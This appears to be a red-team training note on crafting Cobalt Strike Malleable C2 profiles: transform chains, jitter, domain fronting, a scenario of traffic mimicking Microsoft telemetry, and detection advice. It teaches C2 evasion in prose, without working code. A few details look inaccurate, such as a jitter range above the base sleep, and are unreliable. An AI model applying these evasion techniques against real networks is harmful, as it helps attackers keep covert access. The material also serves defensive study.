---
tags: [cobalt-strike, malleable-c2, red-team, vapt]
difficulty: advanced
module: "96 - Cobalt Strike and Advanced Malleable C2"
topic: "96.08 Crafting Advanced Malleable C2 Profiles for OPSEC"
---

# Crafting Advanced Malleable C2 Profiles for OPSEC

## Introduction to Network Traffic OPSEC
While memory evasion and process injection focus on bypassing local endpoint controls, network traffic evasion focuses on bypassing perimeter defenses, Intrusion Detection Systems (IDS), Intrusion Prevention Systems (IPS), and network threat hunting platforms (like Zeek or RITA). 

Network defenders analyze traffic for regular beaconing intervals (jitter analysis), anomalous user-agent strings, known malicious URIs, and predictable payload structures in HTTP/HTTPS requests and responses. Cobalt Strike's Malleable C2 language provides a framework to completely reshape the C2 traffic, allowing it to mimic legitimate services, blend into background noise, and encode payloads to bypass deep packet inspection (DPI).

## The Anatomy of Malleable C2 HTTP Blocks
A Malleable C2 profile defines the network communication using the `http-get` (for beaconing and downloading tasks) and `http-post` (for uploading data and task results) blocks. Each block is subdivided into `client` (what the Beacon sends) and `server` (what the C2 server responds with) sections.

### Data Transformation and Encoding
The most powerful aspect of Malleable C2 is the ability to transform data before it is transmitted. Data transforms apply sequentially.

Common transforms include:
- `base64` / `base64url`: Standard Base64 encoding.
- `mask`: XORs the data with a randomly generated 4-byte key. Crucial for defeating static signatures.
- `netbios` / `netbiosu`: Encodes data into NetBIOS name format (often used to disguise data within DNS or SMB profiles, but applicable elsewhere).
- `prepend` / `append`: Adds static strings before or after the data.

### Profile Strategy: Mimicking Legitimate APIs
When designing a profile, it is best to mimic a legitimate service that naturally exists in the target environment. Good examples include:
- Microsoft Update or Azure Telemetry (JSON/XML heavy, frequent check-ins).
- jQuery or Web Font CDNs (Static file requests, Base64 data).
- Amazon AWS API (Standard RESTful structures).

## Advanced OPSEC Configuration Directives

Beyond formatting the HTTP request, the profile controls the behavioral rhythm of the Beacon.

1. **`sleeptime` and `jitter`:**
   - `sleeptime` defines the base interval between check-ins (in milliseconds).
   - `jitter` defines a percentage of randomization applied to the sleeptime.
   A 60-second sleep with 37% jitter means the Beacon will check in at random intervals between ~37.8 seconds and ~82.2 seconds. This completely destroys the periodicity that tools like RITA rely on to detect beaconing behavior.

2. **`data_jitter`:**
   Appends a random length of null bytes or random data to the HTTP requests/responses to ensure that payload sizes vary, defeating signatures based on consistent packet sizes.

3. **Domain Fronting and HTTP Host Headers:**
   By manipulating the `Host` header within the `client` block, operators can utilize Domain Fronting. The DNS request and SNI (Server Name Indication) point to a high-reputation domain (e.g., `ajax.microsoft.com` hosted on a CDN), while the HTTP `Host` header points to the attacker's actual CDN endpoint. The CDN routes the traffic based on the `Host` header, hiding the true destination from network defenders.

## Detailed Table: Transform Operations and IDS Bypasses

| Transform Chain | Input Data | Final Output Format | Target IDS Bypass Strategy |
| :--- | :--- | :--- | :--- |
| `mask` -> `base64url` -> `prepend "id="` | Metadata Bytes | `id=V3xS...` (Cookie Value) | Evades Snort rules looking for Cobalt Strike headers; looks like a tracking cookie. |
| `mask` -> `netbios` -> `append ".com"` | Task Output | `AABBCCDD.com` (DNS Query) | DNS tunneling over HTTP; bypasses basic string matching. |
| `base64` -> `prepend '{"data":"'` -> `append '"}'` | Task Payload | `{"data":"base64_string"}` | Blends into RESTful API telemetry; Zeek will classify it as standard JSON. |
| `mask` -> `prepend "\\x00\\x01"` | Raw Shellcode | Binary Blob | Defeats simple entropy analysis by adding predictable file headers. |

## Custom ASCII Diagram

```text
+-----------------------------------------------------------------------------------+
|                            C2 Traffic Mimicry Architecture                        |
+-----------------------------------------------------------------------------------+
|                                                                                   |
|  [ Compromised Host ]                                                             |
|         |                                                                         |
|         |  Data: "Task Output: Directory Listing..."                              |
|         |  Transform: Mask (XOR) -> Base64 -> Prepend("data=")                    |
|         v                                                                         |
|  [ Outbound HTTP Request ]                                                        |
|    POST /api/v2/logs HTTP/1.1                                                     |
|    Host: api.legitimate-domain.com                                                |
|    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...                       |
|    Cookie: session_id=TmV3U2Vzc2lvbkRhdGE=                                        |
|    Content-Type: application/x-www-form-urlencoded                                |
|                                                                                   |
|    data=XkdfR0E...<obfuscated_payload>...==                                       |
|         |                                                                         |
|         v                                                                         |
|  [ Network Defenses (IDS/IPS/Zeek) ]                                              |
|    - Inspects URI: /api/v2/logs (Looks normal)                                    |
|    - Inspects Headers: Normal User-Agent, valid Host                              |
|    - Inspects Body: Base64 data, matches expected application flow                |
|    - Result: ALLOW (Traffic classified as benign telemetry)                       |
|         |                                                                         |
|         v                                                                         |
|  [ Attacker C2 Infrastructure (Team Server) ]                                     |
|         |  Reverse Transform: Strip("data=") -> Base64 Decode -> Unmask (XOR)     |
|         v                                                                         |
|  [ Cobalt Strike Client ] -> Output Displayed to Operator                         |
|                                                                                   |
+-----------------------------------------------------------------------------------+
```

## Real-World Attack Scenario

### Scenario: Bypassing Strict Egress Filtering and Zeek Analysis

**Context:** The Red Team is operating within a highly secure network. Egress traffic is strictly filtered, allowing only HTTPS to known good categories. The network is heavily monitored by Zeek, which performs deep packet inspection and beaconing analysis via RITA.

**Execution:**
1. **Traffic Profiling:** The operator analyzes the baseline traffic of the network and notes heavy usage of Microsoft Office 365 and Azure telemetry services.
2. **Profile Creation:** The operator crafts a Malleable C2 profile that precisely mimics Microsoft's asynchronous telemetry endpoints (`vortex.data.microsoft.com`).
3. **Configuration:**
   - The `http-post` block is configured to send data via large JSON blobs wrapped in Base64 encoding, mimicking the structure of Microsoft diagnostic logs.
   - The `Host` header is set to a spoofed telemetry domain.
   - The `sleeptime` is set to 5 minutes (300000 ms) with a `jitter` of 55%. This long sleep time and high jitter make the traffic incredibly sparse and irregular.
4. **Execution:** The Beacon executes and begins communicating.
5. **Network Analysis:** Zeek captures the traffic. The traffic pattern matches the expected high-volume, irregular bursts typical of OS telemetry. RITA fails to calculate a consistent beaconing interval due to the 55% jitter. The DPI engine does not flag the payload because it is masked and structured as a legitimate JSON payload.

**Outcome:** The C2 channel remains established for weeks without triggering any SOC alerts, allowing the Red Team to perform slow, methodical lateral movement.

## Detection Engineering Perspective
Detecting well-crafted Malleable C2 profiles on the network layer requires moving beyond static indicators.
- **Advanced Jitter Analysis:** Standard beaconing detection fails with high jitter. Defenders must look for long-term session persistence between internal IP addresses and external endpoints, regardless of exact timing.
- **Payload Entropy:** Even if data is formatted as JSON, the entropy of base64-encoded encrypted/XORed payloads is significantly higher than that of legitimate plaintext text/json data. High-entropy payloads within seemingly benign structures should be flagged.
- **TLS Fingerprinting (JA3/JA3S):** Cobalt Strike's default HTTP libraries have specific JA3 TLS fingerprints. Modifying the C2 profile alone does not change the JA3 signature. Defenders can use JA3 to identify the underlying client library, regardless of how the HTTP headers are manipulated.

## Chaining Opportunities
- The configurations in this profile must sync with the web delivery infrastructure. See [[10 - Resource Kit and Web Delivery]] for setting up redirectors that perfectly handle the URIs defined in the profile.
- Network OPSEC is irrelevant if the payload is caught in memory. See [[06 - Malleable C2 PE and Memory Indicators]] to secure the payload before it even begins beaconing.
- The user-agent and process behavior should align. If mimicking browser traffic, ensure the payload is injected into a browser process. See [[07 - Malleable C2 Process Injection and Evasion]].

## Related Notes
- [[12 - Threat Hunting with Zeek and RITA]]
- [[26 - TLS Fingerprinting (JA3/JA3S) and Evasion]]
- [[47 - Domain Fronting and CDN Evasion Techniques]]
- [[96 - Cobalt Strike and Advanced Malleable C2/06 - Malleable C2 PE and Memory Indicators]]
- [[96 - Cobalt Strike and Advanced Malleable C2/10 - Resource Kit and Web Delivery]]

<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>
